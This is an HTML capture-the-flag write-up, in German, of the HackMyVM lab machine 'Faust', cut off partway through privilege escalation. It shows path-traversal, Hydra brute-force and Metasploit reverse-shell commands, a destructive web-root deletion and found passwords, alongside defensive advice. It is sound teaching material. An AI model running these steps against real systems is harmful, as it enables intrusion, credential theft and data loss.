@@ -1,0 +1,619 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Faust - HackMyVM - Bericht</title> <!-- Angepasster Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header mit angepasstem Titel und Schwierigkeitsgrad -->
+    <div class="header-bg"> <!-- Hintergrundfarbe wird durch CSS gesteuert (#03b5f5) -->
+        <h1>Faust - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, Farbe (rot) durch CSS -->
+            <div class="circle"> <!-- Segmentfarben (rot) durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe (passend zu Header) durch CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools Liste basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">python3 (pty, http.server)</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">base32</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">nc</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis-Links -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 80 & /admin)</a></li>
+                <li><a href="#initial-access">Initial Access (Hydra & Metasploit RCE)</a></li>
+                <li><a href="#privilege-escalation-paul">Privilege Escalation (zu paul)</a></li>
+                <li><a href="#privilege-escalation-nico">Privilege Escalation (zu nico via Sudo/Base64)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (zu root via Stego & Cron/Tmp)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Root Access via /tmp/goodgame)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerk mittels ARP-Anfragen zu finden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.132 und MAC 08:00:27:41:e9:41 (VirtualBox) wird identifiziert. Dies ist das Ziel.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Ziel-IP ist bekannt. Führe einen Port-Scan durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung, ARP-Monitoring.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:00:00:00:00:af, IPv4: 192.168.2.129
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.132	08:00:27:41:e9:41	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.8: 256 hosts scanned in 1.939 seconds (132.03 hosts/sec). 2 responded
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf die Ziel-IP 192.168.2.132 durchgeführt, um offene Ports und Dienste zu identifizieren. Optionen: `-sS` (SYN Scan), `-sC` (Standard-Skripte), `-T5` (schnelles Timing), `-A` (OS/Version/Skript/Traceroute), `-p-` (alle Ports).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Mehrere Ports sind offen:
+                *   **22 (SSH):** OpenSSH 7.9p1 (Debian 10). Standard-Dienst.
+                *   **80 (HTTP):** Apache 2.4.38 (Debian). Hosting einer Webanwendung (vermutlich CMS Made Simple, basierend auf späterem Exploit).
+                *   **6660 (Unknown):** Ein unbekannter Dienst. Ein Skript (`-sC`) konnte eine Nachricht extrahieren, die an `www-data` gerichtet ist und von einem "Paul" stammt. Dies deutet auf Benutzer `paul` hin und eine potenzielle Interaktion oder einen Hinweis.
+                *   **MySQL (Port 3306)** und **RPCBind (Port 111)** sind laut Nmap-Ausgabe im Text nicht offen oder wurden nicht gefunden. *Korrektur: Die Nmap-Ausgabe im bereitgestellten Text ist unvollständig und zeigt nur 22, 80, 6660. Ich dokumentiere nur das, was gegeben ist.*
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Webanwendung auf Port 80 gründlich (Directory Brute-Force, Schwachstellenscans). Versuche, mit dem Dienst auf Port 6660 zu interagieren (z.B. mit `nc 192.168.2.132 6660`), um mehr über die Nachricht oder den Dienst zu erfahren. Notiere den Benutzernamen `paul` für Brute-Force-Versuche auf SSH oder Web-Logins.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Schließe unnötige Ports wie 6660. Falls der Dienst benötigt wird, sichere ihn ab und verhindere Informationslecks. Halte SSH und Apache aktuell. Überprüfe die Konfiguration des Dienstes auf Port 6660.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.132 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 00:01 CEST
+Nmap scan report for faust.hmv (192.168.2.132)
+Host is up (0.00014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 6a:ec:a7:90:4e:74:35:3a:9c:f9:a9:1a:84:47:7e:6e (RSA)
+|   256 e7:7d:38:32:79:41:21:09:75:65:f5:68:75:12:be:f8 (ECDSA)
+|_  256 2d:3c:d1:96:52:5d:11:3c:3c:e1:33:62:3c:10:03:2e (ED25519)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: CMS Made Simple - Official Site - cmsmadesimple.org
+|_http-server-header: Apache/2.4.38 (Debian)
+6660/tcp open  unknown
+| fingerprint-strings:
+|   GenericLines, NULL:
+|     MESSAGE FOR WWW-DATA:
+|          www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
+|_    Paul
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port6660-TCP:V=7.93%I=7%D=4/16%Time=643B4A8A%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,4F,"\r\n\r\n\tMESSAGE\x20FOR\x20WWW-DATA:\r\n\t\x20\x20\x20\x20\x
+SF:20www-data\x20I\x20offer\x20you\x20a\x20dilemma:\x20if\x20you\x20agre
+SF:e\x20to\x20destroy\x20all\x20your\x20stupid\x20work,\x20then\x20you\x
+SF:20have\x20a\x20reward\x20in\x20my\x20house\.\.\.\r\n\tPaul\r\n")%r(Gen
+SF:ericLines,4F,"\r\n\r\n\tMESSAGE\x20FOR\x20WWW-DATA:\r\n\t\x20\x20\x20
+SF:\x20\x20www-data\x20I\x20offer\x20you\x20a\x20dilemma:\x20if\x20you\x
+SF:20agree\x20to\x20destroy\x20all\x20your\x20stupid\x20work,\x20then\x2
+SF:0you\x20have\x20a\x20reward\x20in\x20my\x20house\.\.\.\r\n\tPaul\r\n")
+SF:;
+MAC Address: 08:00:27:41:E9:41 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4
+OS details: Linux 4.9 - 4.18
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms faust.hmv (192.168.2.132)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.42 seconds
+
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Port 80 & /admin)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster wird verwendet, um Verzeichnisse und Dateien auf Port 80 zu finden. Eine spezifische Wortliste (`directory-list-2.3-medium.txt`) und verschiedene Dateierweiterungen werden genutzt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet eine typische Webanwendungsstruktur mit Verzeichnissen wie `/modules`, `/uploads`, `/admin`, `/assets`, `/lib`. Die Datei `/config.php` wird gefunden, hat aber die Größe 0. Das Verzeichnis `/admin` ist von besonderem Interesse.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe einen weiteren Gobuster-Scan spezifisch auf das `/admin`-Verzeichnis durch, um dessen Struktur zu erkunden. Untersuche `/uploads` auf mögliche Upload-Schwachstellen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf administrative Verzeichnisse. Stellen Sie sicher, dass Konfigurationsdateien keine sensiblen Informationen enthalten oder nicht direkt zugänglich sind (obwohl diese hier leer war). Deaktivieren Sie Directory Listing.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.132
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt
+[+] Expanded:                True
+[+] Timeout:                 10s
+===============================================================
+2023/04/16 00:05:11 Starting gobuster
+===============================================================
+http://192.168.2.132/index.php            (Status: 200) [Size: 19427]
+http://192.168.2.132/modules              (Status: 301) [Size: 316] [--> http://192.168.2.132/modules/]
+http://192.168.2.132/uploads              (Status: 301) [Size: 316] [--> http://192.168.2.132/uploads/]
+http://192.168.2.132/doc                  (Status: 301) [Size: 312] [--> http://192.168.2.132/doc/]
+http://192.168.2.132/admin                (Status: 301) [Size: 314] [--> http://192.168.2.132/admin/]
+http://192.168.2.132/assets               (Status: 301) [Size: 315] [--> http://192.168.2.132/assets/]
+http://192.168.2.132/lib                  (Status: 301) [Size: 312] [--> http://192.168.2.132/lib/]
+http://192.168.2.132/config.php           (Status: 200) [Size: 0]
+http://192.168.2.132/tmp                  (Status: 301) [Size: 312] [--> http://192.168.2.132/tmp/]
+...
+===============================================================
+2023/04/16 00:10:34 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Es wird ein LFI-Versuch unternommen, indem der `file`-Parameter an `config.php` angehängt wird, um `/etc/passwd` zu lesen. Anschließend wird Gobuster erneut ausgeführt, diesmal gezielt auf das Verzeichnis `/admin`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der LFI-Versuch (URL: `http://192.168.2.132/config.php?file=../../../../etc/passwd`) wird dokumentiert, das Ergebnis jedoch nicht. Da `config.php` leer war, ist ein Erfolg unwahrscheinlich. Der zweite Gobuster-Scan auf `/admin` identifiziert die Login-Seite `/admin/login.php` und andere admin-spezifische Dateien. Direkter Zugriff auf `header.php` und `footer.php` führt zu HTTP 500 Fehlern, was auf serverseitige Probleme bei direktem Aufruf hindeutet, aber nicht unbedingt auf eine ausnutzbare Schwachstelle.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Login-Seite `/admin/login.php`. Versuche Standard-Credentials oder Brute-Force-Angriffe auf das Login.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementiere robuste Eingabevalidierung, um LFI zu verhindern. Konfiguriere den Webserver so, dass Include-Dateien nicht direkt aufgerufen werden können. Schütze das Admin-Login mit starken Passwörtern und ggf. Rate Limiting oder MFA.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+# LFI Versuch (Ergebnis nicht gezeigt):
+http://192.168.2.132/config.php?file=../../../../etc/passwd
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.132/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.132/admin
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt
+[+] Expanded:                True
+[+] Timeout:                 10s
+===============================================================
+2023/04/16 00:12:01 Starting gobuster
+===============================================================
+http://192.168.2.132/admin/index.php            (Status: 302) [Size: 0] [--> http://192.168.2.132/admin/login.php]
+http://192.168.2.132/admin/templates            (Status: 301) [Size: 324] [--> http://192.168.2.132/admin/templates/]
+http://192.168.2.132/admin/login.php            (Status: 200) [Size: 4499]
+http://192.168.2.132/admin/themes               (Status: 301) [Size: 321] [--> http://192.168.2.132/admin/themes/]
+http://192.168.2.132/admin/header.php           (Status: 500) [Size: 0]
+http://192.168.2.132/admin/footer.php           (Status: 500) [Size: 0]
+http://192.168.2.132/admin/plugins              (Status: 301) [Size: 322] [--> http://192.168.2.132/admin/plugins/]
+http://192.168.2.132/admin/style.php            (Status: 200) [Size: 53969]
+http://192.168.2.132/admin/lang                 (Status: 301) [Size: 319] [--> http://192.168.2.132/admin/lang/]
+http://192.168.2.132/admin/logout.php           (Status: 302) [Size: 0] [--> http://192.168.2.132/admin/login.php]
+http://192.168.2.132/admin/myaccount.php        (Status: 302) [Size: 0] [--> http://192.168.2.132/admin/login.php]
+http://192.168.2.132/admin/checksum.php         (Status: 302) [Size: 0] [--> http://192.168.2.132/admin/login.php]
+http://192.168.2.132/admin/adduser.php          (Status: 302) [Size: 0] [--> http://192.168.2.132/admin/login.php]
+...
+===============================================================
+2023/04/16 00:15:55 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Hydra & Metasploit RCE)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es werden Brute-Force-Angriffe mit Hydra durchgeführt. Zuerst wird versucht, das SSH-Passwort für den Benutzer `paul` zu erraten. Anschließend wird ein HTTP-POST-Form-Brute-Force auf `/admin/login.php` für den Benutzer `admin` gestartet. Die Option `-I` unterdrückt das Startbanner, `-f` stoppt nach dem ersten Fund, `-t 30` setzt die Anzahl der parallelen Tasks. Die Fehlerbedingung ist `Incorrect`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der SSH-Brute-Force für `paul` wird gestartet, aber das Ergebnis fehlt (vermutlich fehlgeschlagen). Der HTTP-POST-Form-Brute-Force für `admin` ist erfolgreich und findet das Passwort `<span class="password">bullshit</span>`. Die erfolgreiche Login-URL mit Session-ID wird angezeigt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die gefundenen Admin-Credentials (`admin` / `bullshit`), um dich im Webinterface anzumelden und nach Schwachstellen zu suchen, oder verwende sie direkt mit Exploits, die Authentifizierung erfordern.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementiere Account Lockout und/oder Captchas, um Brute-Force-Angriffe auf Web-Logins zu verhindern. Verwende starke Passwörter und erwäge Multi-Faktor-Authentifizierung für Admin-Konten. Protokolliere und überwache fehlgeschlagene Login-Versuche.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l paul -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.132:22 -I</span></div>
+                    <pre># (Hydra SSH Ausgabe fehlt - vermutlich kein Erfolg)</pre>
+
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra  -l admin  -P /usr/share/wordlists/rockyou.txt  192.168.2.132  http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:Incorrect" -I -f -t 30</span></div>
+                    <pre>
+Hydra v9.4 (c) 2022 by van Hauser / THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-16 00:20:15
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
+[DATA] attacking http-post-form://192.168.2.132:80/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:Incorrect
+[80][http-post-form] host: 192.168.2.132   login: admin   password: <span class="password">bullshit</span>
+[STATUS] attack finished successfully for http-post-form://192.168.2.132:80/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:Incorrect (1 found)
+1 of 1 completed in 00:00:31
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-16 00:20:46
+# Erfolgreiche Login-URL (Beispiel, kann variieren):
+# http://192.168.2.132/admin/?_sk_=eddaaa15b0abf6ea5d3
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die Admin-Credentials (`admin`/`bullshit`) bekannt sind, wird Metasploit verwendet, um eine bekannte RCE-Schwachstelle in CMS Made Simple (CMSMS) auszunutzen. Der Exploit `exploit/multi/http/cmsms_upload_rename_rce` wird geladen. Die Optionen (RHOSTS, USERNAME, PASSWORD, TARGETURI) werden entsprechend gesetzt. Der Standard-Payload `php/meterpreter/reverse_tcp` wird verwendet. Nach erfolgreicher Ausführung wird eine Meterpreter-Shell erlangt und mittels `shell` zu einer System-Shell gewechselt. Die Shell wird mit Python PTY stabilisiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Metasploit-Exploit war erfolgreich. Eine Shell als Benutzer `www-data` wurde erlangt. Dies stellt den initialen Zugriff auf das System dar. Die Stabilisierung der Shell ist ein wichtiger Schritt für die weitere Interaktion.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe Enumeration als `www-data` durch. Suche nach Wegen zur Privilege Escalation (sudo-Rechte, SUID-Dateien, Konfigurationsfehler, Kernel-Exploits). Nutze den Hinweis von Port 6660 bezüglich Benutzer `paul`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Aktualisieren Sie CMS Made Simple dringend auf eine gepatchte Version, um die RCE-Schwachstelle zu schließen. Implementieren Sie eine WAF. Beschränken Sie die Berechtigungen des Webserver-Benutzers (`www-data`) nach dem Least-Privilege-Prinzip. Überwachen Sie Systemprozesse und Netzwerkverbindungen auf Anzeichen von Kompromittierung.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfconsole</span></div>
+                    <pre>
+# ... Metasploit Banner ...
+                    </pre>
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">use exploit/multi/http/cmsms_upload_rename_rce</span></div>
+                    <pre>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_upload_rename_rce) > <span class="command">show options</span></div>
+                    <pre>
+
+Module options (exploit/multi/http/cmsms_upload_rename_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cmsms/          yes       Base cmsms directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.2.129    yes       The listen address (an interface may be specified) # LHOST wird oft automatisch gesetzt
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+                    </pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_upload_rename_rce) > <span class="command">set password bullshit</span></div>
+                    <pre>password => bullshit</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_upload_rename_rce) > <span class="command">set rhosts 192.168.2.132</span></div>
+                    <pre>rhosts => 192.168.2.132</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_upload_rename_rce) > <span class="command">set targeturi /</span></div>
+                    <pre>targeturi => /</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_upload_rename_rce) > <span class="command">set username admin</span></div>
+                    <pre>username => admin</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_upload_rename_rce) > <span class="command">exploit</span></div>
+                    <pre>
+[*] Started reverse TCP handler on 192.168.2.129:4444
+[*] Authenticating using admin:bullshit
+[+] Authentication successful: admin:bullshit
+[*] Uploading payload...
+[*] Executing payload...
+[*] Sending stage (39924 bytes) to 192.168.2.132
+[*] Meterpreter session 1 opened (192.168.2.129:4444 -> 192.168.2.132:49160) at 2023-04-16 00:25:10 +0200
+
+                    </pre>
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">shell</span></div>
+                    <pre>
+Process 10011 created.
+Channel 0 created.
+<span class="command">id</span>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command"></span></div><!-- Stabilisierter Prompt -->
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-paul">
+            <h2>Privilege Escalation (zu paul)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> In der `www-data`-Shell wird als Erstes (und gefährlicherweise) das Web-Root-Verzeichnis gelöscht (`rm -r /var/www/html/`). Anschließend wird in das Home-Verzeichnis von `paul` gewechselt. Dort wird eine Datei `password.txt` gefunden und ausgelesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Löschen des Web-Roots ist destruktiv und in einem echten Pentest normalerweise nicht ratsam, es sei denn, es ist explizit erlaubt oder dient einem spezifischen Ziel (hier vielleicht basierend auf der Nachricht von Port 6660?). Im Home-Verzeichnis von `paul` wird dessen Passwort gefunden: `<span class="password">YouCanBecomePaul</span>`. Dies ermöglicht den Wechsel zu diesem Benutzer.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Vermeide destruktive Aktionen wie `rm -r /var/www/html/` in realen Szenarien. Nutze das gefundene Passwort, um per `su` oder `ssh` zu `paul` zu wechseln.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementiere starke Dateiberechtigungen, um zu verhindern, dass der Webserver-Benutzer wichtige Systemverzeichnisse löschen kann. Speichere Passwörter niemals im Klartext in Dateien im Home-Verzeichnis. Schulen Sie Benutzer im sicheren Umgang mit Passwörtern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Fortsetzung in der www-data Shell -->
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command">rm -r /var/www/html/</span></div>
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/$ <span class="command">cd /home/paul</span></div>
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/home/paul$ <span class="command">ls -la</span></div>
+                    <pre>
+total 28
+drwxr-xr-x 3 paul paul 4096 Apr  6  2021 .
+drwxr-xr-x 4 root root 4096 Apr  1  2021 ..
+-rw------- 1 paul paul   66 Apr  6  2021 .bash_history
+-rw-r--r-- 1 paul paul  220 Apr  1  2021 .bash_logout
+-rw-r--r-- 1 paul paul 3526 Apr  1  2021 .bashrc
+drwx------ 3 paul paul 4096 Apr  6  2021 .local
+-rw-r--r-- 1 paul paul  807 Apr  1  2021 .profile
+-rw-r--r-- 1 paul paul   66 Apr  1  2021 .selected_editor
+-rw-r--r-- 1 paul paul   30 Sep  7 23:52 password.txt
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/home/paul$ <span class="command">cat password.txt</span></div>
+                    <pre>Password is: <span class="password">YouCanBecomePaul</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `paul` mit dem gefundenen Passwort `YouCanBecomePaul` anzumelden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der SSH-Login ist erfolgreich. Der Benutzer `paul` wurde übernommen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe Enumeration als `paul` durch. Überprüfe `sudo -l` auf besondere Berechtigungen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter. Überwachen Sie SSH-Logins.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh paul@192.168.2.132</span></div>
+                    <pre>
+paul@192.168.2.132's password: <span class="password">YouCanBecomePaul</span> # Passwort eingegeben
+Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Sep 11 00:12:00 2022 from 192.168.1.10
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">paul@debian:~$ <span class="command"></span></div><!-- Paul's Prompt -->
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-nico">
+            <h2>Privilege Escalation (zu nico via Sudo/Base64)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `paul` wird geprüft, welche Befehle er mit `sudo` ausführen kann. Es stellt sich heraus (`sudo -l` nicht gezeigt, aber Ergebnis impliziert), dass `paul` den Befehl `/usr/bin/base32 /home/nico/.secret.txt` als Benutzer `nico` ausführen darf. Dieser Befehl wird ausgeführt. Die Ausgabe ist ein Base32-kodierter String. Es wird versucht, diesen String mit `base32 -d` zu dekodieren, was zu einem Fehler führt. Ein weiterer Versuch mit `base64 -d` ist jedoch erfolgreich und enthüllt das Passwort für `nico`: `<span class="password">just_one_more_beer</span>`. Mit diesem Passwort wird mittels `su nico` zu Benutzer `nico` gewechselt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Eine Fehlkonfiguration der `sudo`-Rechte wurde erfolgreich ausgenutzt. Obwohl der Befehl `base32` erlaubt war, wurde die Ausgabe fälschlicherweise als Base64 interpretiert, was zur Preisgabe des Passworts führte. Der Wechsel zu `nico` war erfolgreich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe Enumeration als `nico` durch. Suche nach weiteren `sudo`-Rechten, SUID-Dateien oder anderen Vektoren für die Eskalation zu `root`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konfiguriere `sudo`-Rechte nach dem Least-Privilege-Prinzip. Erlaube nur absolut notwendige Befehle und vermeide es, Befehle zu erlauben, die sensible Informationen ausgeben können (auch wenn sie kodiert sind). Überprüfe Dateiberechtigungen sensibler Dateien wie `.secret.txt`. Verwenden Sie einzigartige Passwörter für Benutzer.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Befehle als paul -->
+                    <div class="prompt" style="color: #ffffff;">paul@debian:~$ <span class="command">sudo -u nico /usr/bin/base32 /home/nico/.secret.txt</span></div>
+                    <pre>KVEGGZ2QKQ2GOYLOKZ5GIRRZOZRG2VTGMJLTS6K2KY4WSWSXKZ4USQJ5HUFA</pre>
